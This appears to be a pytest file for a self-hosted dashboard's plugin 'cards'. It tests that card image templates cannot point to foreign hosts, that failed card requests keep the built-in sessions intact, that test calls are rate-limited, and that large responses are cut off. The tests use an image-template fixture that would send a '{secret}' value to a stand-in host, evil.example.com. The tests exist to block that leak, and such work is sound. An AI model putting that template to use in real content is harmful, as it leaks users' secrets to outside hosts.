"""Corrections after the review of "every connection can be read by a card" (korrektur J1, F3 to F9).

A card can come from a shop, so none of this is left to the author: a picture does not lead off to another host with a value
of the connection in it, a refused request does not cost the built-in cards their session, and the memory of what is read is
bounded.
"""

from __future__ import annotations

from typing import Any

import pytest

from app.adapters import get_adapter
from app.adapters.custom import present
from app.cards import images, load, pipeline
from app.cards.load import CardInvalid

BASE = "http://svc.example.com:8080"

HEAD = """\
nexdeck-card: 1
slug: covers
name: Sample
version: "1.0.0"
requires: [sonarr]
requests:
  - id: queue
    path: /api/v3/queue
form: posters
rows: {select: records}
item:
  title: title
"""


def problems_of(image: str) -> list[Any]:
    with pytest.raises(CardInvalid) as invalid:
        load.load_definition(HEAD + image)
    return invalid.value.problems


# -- F3: a picture is a value of the answer or a path on the connection ------------------------------------


@pytest.mark.parametrize(
    "image",
    [
        "  image: {template: 'https://evil.example.com/p.png?d={secret}'}\n",
        "  image: {template: '{poster}'}\n",
        "  image: {template: '//evil.example.com/p.png'}\n",
        "  image: {template: 'http://svc.example.com:8080/p/{id}.jpg'}\n",
        "  image: {formula: '{poster} + 1'}\n",
    ],
)
def test_korrektur_f3_a_picture_made_from_a_template_or_a_formula_has_to_be_a_path_on_the_connection(image: str) -> None:
    found = problems_of(image)
    assert [one.code for one in found] == ["card_picture_address"]
    assert found[0].line == 13 and found[0].path.startswith("item.image"), "the problem sits on the line of the picture"


def test_korrektur_f3_a_path_and_a_template_that_starts_with_a_single_slash_are_fine() -> None:
    for image in ("  image: poster\n", "  image: {path: poster}\n", "  image: {template: '/MediaCover/{id}/poster.jpg'}\n"):
        load.load_definition(HEAD + image)


def present_unchecked(image: dict[str, Any], row: dict[str, Any]) -> Any:
    """A definition that did not pass the check (a card from before it, or one kept in the table), shown with a row."""
    data = {
        "nexdeck-card": 1, "slug": "covers", "name": "Sample", "version": "1.0.0", "requires": ["sonarr"],
        "requests": [{"id": "queue", "path": "/api/v3/queue"}], "form": "posters", "rows": {"select": "records"},
        "item": {"title": "title", "image": image},
    }
    definition = load.definition_from_data(data)
    return present(definition, pipeline.run(definition, {"queue": {"records": [row]}}), base=BASE)


def test_korrektur_f3_at_run_time_a_made_up_address_to_another_host_is_no_picture_and_a_named_one_is() -> None:
    row = {"title": "A", "secret": "SUPERSECRETKEY", "poster": "https://img.example.com/a.jpg"}
    made = present_unchecked({"template": "https://evil.example.com/p.png?d={secret}"}, row)
    assert "art" not in made.items[0], "an address put together by the card is not fetched from another host"
    named = present_unchecked({"path": "poster"}, row)
    assert images.external_address(named.items[0]["art"].removeprefix("proxy:")) == "https://img.example.com/a.jpg"
    local = present_unchecked({"template": "/MediaCover/{title}/p.jpg"}, row)
    assert images.connection_path(local.items[0]["art"].removeprefix("proxy:"), BASE) == "/MediaCover/A/p.jpg"


def test_korrektur_f3_the_reference_refuses_a_foreign_address_unless_the_answer_named_it_whole() -> None:
    assert images.reference("https://img.example.com/a.jpg", BASE, named=False) == ""
    assert images.reference("https://img.example.com/a.jpg", BASE, named=True).startswith(f"proxy:{images.EXTERNAL}?")
    assert images.reference(f"{BASE}/p/a.jpg", BASE, named=False).startswith(f"proxy:{images.CONNECTION}?")
    assert get_adapter("sonarr").raw_access


# -- F1: a refused request of a card does not cost the built-in cards their session ---------------------------

import asyncio  # noqa: E402
import gzip  # noqa: E402
import time  # noqa: E402

import httpx  # noqa: E402
import respx  # noqa: E402

from app.adapters import rawread  # noqa: E402
from app.adapters.base import AdapterError, AuthFailed, Context  # noqa: E402

PASSWORD = "Zk-password-1"


def context() -> Context:
    return Context(httpx.AsyncClient(), integration_id=1, widget_id=1, cache={})


class PiHole:
    """Pi-hole as it behaves: a session per sign-in, and a path the account may not read (401 whatever the session)."""

    def __init__(self) -> None:
        self.logins = 0
        self.valid: str | None = None

    def login(self, request: httpx.Request) -> httpx.Response:
        self.logins += 1
        self.valid = f"sid-{self.logins}"
        return httpx.Response(200, json={"session": {"valid": True, "sid": self.valid}})

    def read(self, request: httpx.Request) -> httpx.Response:
        if request.url.path == "/api/config" or request.headers.get("sid") != self.valid:
            return httpx.Response(401, json={})
        return httpx.Response(200, json={"version": {"core": {"local": {"version": "6.0"}}}})


@respx.mock
async def test_korrektur_f1_a_401_on_a_path_the_built_in_cards_do_not_need_signs_nobody_in_again_pihole(monkeypatch: pytest.MonkeyPatch) -> None:
    service = PiHole()
    respx.post(f"{BASE}/api/auth").mock(side_effect=service.login)
    respx.get(url__regex=rf"{BASE}/api/.*").mock(side_effect=service.read)
    adapter, config, held = get_adapter("pihole"), {"url": BASE, "password": PASSWORD}, context()
    runs = count_tests(monkeypatch, adapter)
    for _ in range(6):
        with pytest.raises(AuthFailed):
            await adapter.raw_request("GET", "/api/config", config, held)
    assert runs[0] == 3, "learn how to sign, look at the session, learn again; the five refusals after the first are the card's own"
    assert service.logins == 1, "one sign-in for all six refreshes, the one the kind's own card would have made"
    assert held.cache.get("pihole_sid") == "sid-1", "the session of the built-in cards is still there"
    assert (await adapter.test(config, held)).startswith("Pi-hole") and service.logins == 1


class Reolink:
    def __init__(self) -> None:
        self.logins = 0
        self.logouts = 0

    def post(self, request: httpx.Request) -> httpx.Response:
        command = request.url.params.get("cmd")
        if command == "Login":
            self.logins += 1
            return httpx.Response(200, json=[{"cmd": "Login", "code": 0, "value": {"Token": {"name": f"tok-{self.logins}", "leaseTime": 3600}}}])
        if command == "Logout":
            self.logouts += 1
            return httpx.Response(200, json=[{"cmd": "Logout", "code": 0}])
        return httpx.Response(200, json=[{"cmd": command, "code": 0, "value": {"DevInfo": {"model": "RLN8", "firmVer": "v3"}}}])


@respx.mock
async def test_korrektur_f1_a_401_on_a_path_of_a_card_costs_no_sign_in_no_seat_and_no_cooldown_reolink() -> None:
    service = Reolink()
    respx.post(f"{BASE}/api.cgi").mock(side_effect=service.post)
    respx.get(url__regex=rf"{BASE}/api\.cgi.*").mock(return_value=httpx.Response(401, text="no"))
    adapter, config, held = get_adapter("reolink"), {"url": BASE, "username": "admin", "password": PASSWORD}, context()
    with pytest.raises(AuthFailed):
        await adapter.raw_request("GET", "/api.cgi?cmd=GetUser", config, held)
    assert service.logins == 1
    held.cache["reolink_login_blocked_until"] = time.monotonic() + 3000.0  # the device said "too many sessions" a moment ago
    for _ in range(5):
        with pytest.raises(AuthFailed):
            await adapter.raw_request("GET", "/api.cgi?cmd=GetUser", config, held)
    assert (service.logins, service.logouts) == (1, 0), "no sign-in on top, no seat left behind"
    assert held.cache["reolink_token"][0] == "tok-1" and held.cache["reolink_login_blocked_until"] > time.monotonic() + 2000


# -- F5: one test at a time, remembered, at most every five minutes -----------------------------------------


class Clock:
    def __init__(self, monkeypatch: pytest.MonkeyPatch) -> None:
        self.offset = 0.0
        real = time.monotonic
        monkeypatch.setattr(time, "monotonic", lambda: real() + self.offset)


def count_tests(monkeypatch: pytest.MonkeyPatch, adapter: Any) -> list[int]:
    runs = [0]
    original = adapter.test

    async def counted(config: dict[str, Any], ctx: Context) -> str:
        runs[0] += 1
        await asyncio.sleep(0.01)
        return await original(config, ctx)  # type: ignore[no-any-return]

    monkeypatch.setattr(adapter, "test", counted)
    return runs


@respx.mock
async def test_korrektur_f5_ten_cards_that_start_together_run_the_test_once_and_again_only_after_five_minutes(monkeypatch: pytest.MonkeyPatch) -> None:
    clock = Clock(monkeypatch)
    service = PiHole()
    respx.post(f"{BASE}/api/auth").mock(side_effect=service.login)
    respx.get(url__regex=rf"{BASE}/api/.*").mock(side_effect=service.read)
    adapter, config, held = get_adapter("pihole"), {"url": BASE, "password": PASSWORD}, context()
    runs = count_tests(monkeypatch, adapter)
    await asyncio.gather(*(adapter.raw_request("GET", f"/api/stats/{n}", config, held) for n in range(10)))
    assert runs[0] == 1 and service.logins == 1
    clock.offset = 200.0
    await asyncio.gather(*(adapter.raw_request("GET", f"/api/stats/{n}", config, held) for n in range(10)))
    assert runs[0] == 1, "within the five minutes the kind is not asked again"
    clock.offset = 400.0
    await asyncio.gather(*(adapter.raw_request("GET", f"/api/stats/{n}", config, held) for n in range(10)))
    assert runs[0] == 2 and service.logins == 1, "after five minutes once more, and the session of the kind is still the one"


@respx.mock
async def test_korrektur_f5_a_test_that_failed_is_not_run_again_for_every_refresh(monkeypatch: pytest.MonkeyPatch) -> None:
    clock = Clock(monkeypatch)
    respx.post(f"{BASE}/api/auth").mock(return_value=httpx.Response(401, json={"session": {"valid": False}}))
    adapter, config, held = get_adapter("pihole"), {"url": BASE, "password": PASSWORD}, context()
    runs = count_tests(monkeypatch, adapter)
    for _ in range(10):
        with pytest.raises(AuthFailed):
            await adapter.raw_request("GET", "/api/stats/x", config, held)
    assert runs[0] == 1, "ten refreshes, one test"
    clock.offset = 60.0
    with pytest.raises(AuthFailed):
        await adapter.raw_request("GET", "/api/stats/x", config, held)
    assert runs[0] == 2, "the pause is over: the service is asked again"


# -- F6: the 2 MB are read, not read and then counted ----------------------------------------------------------

CHUNK = b"x" * 65536


def streaming(chunks: int, consumed: list[int], *, declared: int | None = None) -> httpx.Response:
    async def body() -> Any:
        for _ in range(chunks):
            consumed[0] += 1
            yield CHUNK

    headers = {"content-length": str(declared)} if declared is not None else {}
    return httpx.Response(200, content=body(), headers=headers)


@respx.mock
async def test_korrektur_f6_a_large_answer_is_given_up_while_it_is_read() -> None:
    consumed = [0]
    respx.get(f"{BASE}/api/v3/log").mock(side_effect=lambda request: streaming(300, consumed))  # 19 MB if it were read
    adapter, config = get_adapter("radarr"), {"url": BASE, "api_key": "Zk-key"}
    with pytest.raises(AdapterError) as refused:
        await adapter.raw_request("GET", "/api/v3/log", config, context())
    assert refused.value.code == "answer_too_large"
    assert consumed[0] * len(CHUNK) <= rawread.READ_AT_MOST + 2 * len(CHUNK), "it stopped reading at the limit"


@respx.mock
async def test_korrektur_f6_a_declared_length_beyond_the_limit_is_believed_before_a_byte_is_read() -> None:
    consumed = [0]
    respx.get(f"{BASE}/api/v3/log").mock(side_effect=lambda request: streaming(300, consumed, declared=20 * 1024 * 1024))
    with pytest.raises(AdapterError) as refused:
        await get_adapter("radarr").raw_request("GET", "/api/v3/log", {"url": BASE, "api_key": "Zk-key"}, context())
    assert refused.value.code == "answer_too_large" and consumed[0] <= 1


@respx.mock
async def test_korrektur_f6_a_small_and_a_compressed_answer_are_read_as_before() -> None:
    respx.get(f"{BASE}/api/v3/small").mock(return_value=httpx.Response(200, json={"a": 1}))
    respx.get(f"{BASE}/api/v3/zipped").mock(
        return_value=httpx.Response(200, content=gzip.compress(b'{"b": 2}'), headers={"content-encoding": "gzip", "content-type": "application/json"})
    )
    adapter, config = get_adapter("radarr"), {"url": BASE, "api_key": "Zk-key"}
    assert (await adapter.raw_request("GET", "/api/v3/small", config, context())).json() == {"a": 1}
    assert (await adapter.raw_request("GET", "/api/v3/zipped", config, context())).json() == {"b": 2}
